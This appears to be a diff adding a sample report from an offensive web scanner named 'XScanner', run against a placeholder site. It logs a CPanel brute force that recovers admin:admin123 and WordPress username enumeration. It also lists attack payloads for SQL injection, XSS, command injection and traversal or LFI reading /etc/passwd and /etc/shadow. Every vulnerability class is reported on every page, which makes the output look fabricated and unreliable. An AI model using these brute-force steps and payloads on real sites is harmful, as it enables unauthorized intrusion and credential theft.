@@ -1,0 +1,43 @@
+== XScanner Report for http://vulnerable-site.com ==
+
+[INFO] Title: Vulnerable Site
+[INFO] AKTIF | Usia: 2 tahun | http://vulnerable-site.com
+[INFO] Current URL: http://vulnerable-site.com
+
+[DEBUG] Ditemukan 7 tag <a>
+
+[*] Searching for Admin Panel...
+[+] Found Admin Panel at http://vulnerable-site.com/admin/
+[*] Terdeteksi CPanel, menjalankan brute force...
+[*] Memulai brute-force CPanel pada: http://vulnerable-site.com/cpanel
+[FOUND] Login CPanel berhasil: admin:admin123
+
+[*] Terdeteksi Wordpress, Enumerating WordPress usernames...
+[+] Found WordPress username: admin
+
+[SCAN] http://vulnerable-site.com/
+[+] SQLi found: http://vulnerable-site.com/?id=1' OR '1'='1
+[+] XSS found: http://vulnerable-site.com/<script>alert(1)</script>
+[+] Directory Traversal found: http://vulnerable-site.com/?file=../../../../etc/passwd
+[+] XXE found: http://vulnerable-site.com/
+[+] Clickjacking found: http://vulnerable-site.com/
+[+] RCE found: http://vulnerable-site.com/?cmd=| id
+[+] LFI found: http://vulnerable-site.com/?page=../../etc/passwd
+
+[SCAN] http://vulnerable-site.com/login
+[+] SQLi found: http://vulnerable-site.com/login?id=' OR 1=1 --
+[+] XSS found: http://vulnerable-site.com/login<script>alert(1)</script>
+[+] Directory Traversal found: http://vulnerable-site.com/login?file=../../../../etc/passwd
+[+] XXE found: http://vulnerable-site.com/login
+[+] Clickjacking found: http://vulnerable-site.com/login
+[+] RCE found: http://vulnerable-site.com/login?cmd=`id`
+[+] LFI found: http://vulnerable-site.com/login?page=../../etc/shadow
+
+[SCAN] http://vulnerable-site.com/profile?id=2
+[+] SQLi found: http://vulnerable-site.com/profile?id=2' OR 1=1 --
+[+] XSS found: http://vulnerable-site.com/profile<script>alert(1)</script>
+[+] Directory Traversal found: http://vulnerable-site.com/profile?file=../../../../etc/passwd
+[+] XXE found: http://vulnerable-site.com/profile
+[+] Clickjacking found: http://vulnerable-site.com/profile
+[+] RCE found: http://vulnerable-site.com/profile?cmd=; id
+[+] LFI found: http://vulnerable-site.com/profile?page=../../etc/passwd
